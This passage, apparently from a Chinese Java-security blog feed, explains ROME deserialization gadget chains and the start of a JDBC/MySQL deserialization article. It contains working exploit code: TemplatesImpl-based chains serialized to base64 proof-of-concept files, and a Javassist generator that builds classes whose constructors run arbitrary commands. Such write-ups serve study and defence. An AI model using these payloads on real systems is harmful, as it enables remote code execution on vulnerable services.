class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.Tools.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RomeUnserial3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] evilCodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Code\\Java-code\\ROMEUnseria\\target\\test-classes\\evil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] evil = &#123;evilCodes&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//  EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        hashtable.put(objectBean, <span class="string">&quot;111&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, evil);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> serialize2base64(hashtable);</span><br><span class="line">        string2file(poc, <span class="string">&quot;poc3.txt&quot;</span>);</span><br><span class="line">        InspectB64Poc(<span class="string">&quot;poc3.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="配合CC链"><a href="#配合CC链" class="headerlink" title="配合CC链"></a>配合CC链</h3><p>当然也可以使用CC中的任意方法调用来调用toString方法</p><h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><p>JdbcRowSetImpl在FastJson中在&lt;&#x3D;1.2.24时使用的一个链子，这是针对后半段动态类加载不出网换成出网</p><h3 id="HotSwappableTargetSource"><a href="#HotSwappableTargetSource" class="headerlink" title="HotSwappableTargetSource"></a>HotSwappableTargetSource</h3><p>spring原生的toString利用链</p><p>需要添加spring依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.19.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="缩短Payload"><a href="#缩短Payload" class="headerlink" title="缩短Payload"></a>缩短Payload</h2><p>当payload长度被限制时, 即使最短的链条也无法成功执行, 因此需要进一步缩短</p><h3 id="使用Javassist缩短恶意class"><a href="#使用Javassist缩短恶意class" class="headerlink" title="使用Javassist缩短恶意class"></a>使用Javassist缩短恶意class</h3><blockquote><h4 id="Javassist："><a href="#Javassist：" class="headerlink" title="Javassist："></a>Javassist：</h4><p>Java 字节码以二进制的形式存储在 .class 文件中，每一个.class文件包含一个Java类或接口。Javaassist 就是一个用来处理Java字节码的类库。它可以在一个已经编译好的类中添加新的方法，或者是修改已有的方法，并且不需要对字节码方面有深入的了解。同时也可以通过手动的方式去生成一个新的类对象。其使用方式类似于反射。</p></blockquote><blockquote><h4 id="CtClass"><a href="#CtClass" class="headerlink" title="CtClass"></a>CtClass</h4><p>可以将其理解成加强版的Class对象，我们可以通过CtClass对目标类进行各种操作。可以<code>ClassPool.get(ClassName)</code>中获取。</p></blockquote><blockquote><h4 id="ClassPool"><a href="#ClassPool" class="headerlink" title="ClassPool"></a>ClassPool</h4><p><code>ClassPool</code>是<code>CtClass</code>对象的容器。<code>CtClass</code>对象必须从该对象获得。如果<code>get()</code>在此对象上调用，则它将搜索表示的各种源<code>ClassPath</code> 以查找类文件，然后创建一个<code>CtClass</code>表示该类文件的对象。创建的对象将返回给调用者。可以将其理解为一个存放<code>CtClass</code>对象的容器。</p><p>获得方法： <code>ClassPool cp = ClassPool.getDefault();</code>。通过 <code>ClassPool.getDefault()</code> 获取的 <code>ClassPool</code> 使用 JVM 的类搜索路径。<strong>如果程序运行在 JBoss 或者 Tomcat 等 Web 服务器上，ClassPool 可能无法找到用户的类</strong>，因为Web服务器使用多个类加载器作为系统类加载器。在这种情况下，<strong>ClassPool 必须添加额外的类搜索路径</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(&lt;Class&gt;));</span><br></pre></td></tr></table></figure></blockquote><blockquote><h4 id="CtMethod"><a href="#CtMethod" class="headerlink" title="CtMethod"></a>CtMethod</h4><p>同理，可以理解成加强版的<code>Method</code>对象。可通过<code>CtClass.getDeclaredMethod(MethodName)</code>获取，该类提供了一些方法以便我们能够直接修改方法体</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">CtMethod</span> <span class="keyword">extends</span> <span class="title class_">CtBehavior</span> &#123;</span><br><span class="line">    <span class="comment">// 主要的内容都在父类 CtBehavior 中</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 父类 CtBehavior</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">CtBehavior</span> <span class="keyword">extends</span> <span class="title class_">CtMember</span> &#123;</span><br><span class="line">    <span class="comment">// 设置方法体</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setBody</span><span class="params">(String src)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 插入在方法体最前面</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertBefore</span><span class="params">(String src)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 插入在方法体最后面</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertAfter</span><span class="params">(String src)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在方法体的某一行插入内容</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">insertAt</span><span class="params">(<span class="type">int</span> lineNum, String src)</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>feng师傅还介绍了几种对应的语言扩展：</p><table><thead><tr><th>符号</th><th>含义</th></tr></thead><tbody><tr><td>$0,$1, $2, …</td><td>$0 &#x3D; this; $1 &#x3D; args[1] …..</td></tr><tr><td>$args</td><td>方法参数数组.它的类型为 Object[]</td></tr><tr><td>$$</td><td>所有实参。例如, m($$) 等价于 m(1,2,…)</td></tr><tr><td>$cflow(…)</td><td>cflow 变量</td></tr><tr><td>$r</td><td>返回结果的类型，用于强制类型转换</td></tr><tr><td>$w</td><td>包装器类型，用于强制类型转换</td></tr><tr><td>$_</td><td>返回值</td></tr><tr><td>$sig</td><td>类型为 java.lang.Class 的参数类型数组</td></tr><tr><td>$type</td><td>一个 java.lang.Class 对象，表示返回值类型</td></tr><tr><td>$class</td><td>一个 java.lang.Class 对象，表示当前正在修改的类</td></tr></tbody></table><p>关于<code>TemplatesImpl</code>这个类, 实际上不只是加载了字节码, 最终还对加载的类进行了实例化, 如图</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240821123921875.png" alt="image-20240821123921875"></p><p>因此可以把恶意代码放在构造器中</p><p>这样就可以简单生成一个恶意类, 这种直接生成字节码的方式跳过了编译阶段, 因此也不需要重写父类的方法:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GetShellCode</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> CtClass <span class="title function_">getTemplatesImpl</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            ctClass = pool.makeClass(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> CtNewConstructor.make(<span class="string">&quot;public A()&#123;Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;);\n&#125;&quot;</span>, ctClass);</span><br><span class="line">            ctClass.addConstructor(constructor);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> ctClass;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (CannotCompileException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">WriteEvilClass</span><span class="params">()</span> <span class="keyword">throws</span> CannotCompileException, IOException &#123;</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">shell</span> <span class="operator">=</span> GetShellCode.getTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        shell.writeFile(<span class="string">&quot;D:\\Code\\Java-code\\ROMEUnseria\\target\\test-classes\\JavaassitShellCode&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> CannotCompileException, IOException &#123;</span><br><span class="line">        WriteEvilClass();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>对比一下大小:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240821125141207.png" alt="image-20240821125141207"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240821125203492.png" alt="image-20240821125203492"></p><p>明显缩小了很多</p><p>直接把这个方法封装起来使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.n4c1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.Tools.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShellCode</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> TemplatesImpl <span class="title function_">getEvilTemplatesImpl</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[][] evilbytes = &#123;getEvilClassCode(cmd, <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>)&#125;;</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, evilbytes);</span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getEvilClassCode(String cmd, String superclass) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(superclass);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> CtNewConstructor.make(<span class="string">&quot;public A()&#123;Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;);\n&#125;&quot;</span>, ctClass);</span><br><span class="line">            ctClass.addConstructor(constructor);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception  e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样写exp也简化了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RomeUnserial</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> getEvilTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templates);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(equalsBean, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> serialize2base64(hashMap);</span><br><span class="line">        string2file(poc, <span class="string">&quot;poc.txt&quot;</span>);</span><br><span class="line">        InspectB64Poc(<span class="string">&quot;poc.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/12768">https://xz.aliyun.com/t/12768</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> ROME反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JDBC反序列化</title>
      <link href="/2024/08/19/JDBC%20Attack%20for%20Mysql/"/>
      <url>/2024/08/19/JDBC%20Attack%20for%20Mysql/</url>
      
        <content type="html"><![CDATA[<h2 id="JDBC基础"><a href="#JDBC基础" class="headerlink" title="JDBC基础"></a>JDBC基础</h2><p>参考</p><p><a href="https://liaoxuefeng.com/books/java/jdbc/basic/">https://liaoxuefeng.com/books/java/jdbc/basic/</a></p><p>浅尝一下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>数据库版本为 8.0.12</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jdbcDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://localhost:3306/learnjdbc?useSSL=false&amp;characterEncoding=utf8&amp;serverTimezone=GMT&quot;</span>; <span class="comment">// 这里加上serverTimezone=GMT 不然会报错</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">user</span> <span class="operator">=</span> <span class="string">&quot;learn&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;learnpassword&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(url, user, password)) &#123;</span><br><span class="line">            <span class="keyword">try</span> (<span class="type">PreparedStatement</span> <span class="variable">ps</span> <span class="operator">=</span> conn.prepareStatement(<span class="string">&quot;SELECT id, grade, name, gender FROM students WHERE gender=? AND grade=?&quot;</span>))&#123;</span><br><span class="line">                ps.setObject(<span class="number">1</span>, <span class="string">&quot;M&quot;</span>);</span><br><span class="line">                ps.setObject(<span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">                <span class="keyword">try</span> (<span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> ps.executeQuery())&#123;</span><br><span class="line">                    <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">                        <span class="type">long</span> <span class="variable">id</span> <span class="operator">=</span> rs.getLong(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">                        <span class="type">long</span> <span class="variable">grade</span> <span class="operator">=</span> rs.getLong(<span class="string">&quot;grade&quot;</span>);</span><br><span class="line">                        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">                        <span class="type">String</span> <span class="variable">gender</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;gender&quot;</span>);</span><br><span class="line">                        System.out.println(String.format(<span class="string">&quot;%d %d %s %s&quot;</span>, id, grade, name, gender));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="JDBC反序列化"><a href="#JDBC反序列化" class="headerlink" title="JDBC反序列化"></a>JDBC反序列化</h2><h3 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h3><p>首先看一下链子是怎么来的</p><p>原作者在<code>com.mysql.cj.jdbc.result.ResultSetImpl.getObject()</code>中发现了一个反序列化的入口</p><p>再找调用了<code>getObject</code>的地方</p><p>在 <code>com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor#populateMapWithSessionStatusValues()</code></p><figure class="highlight 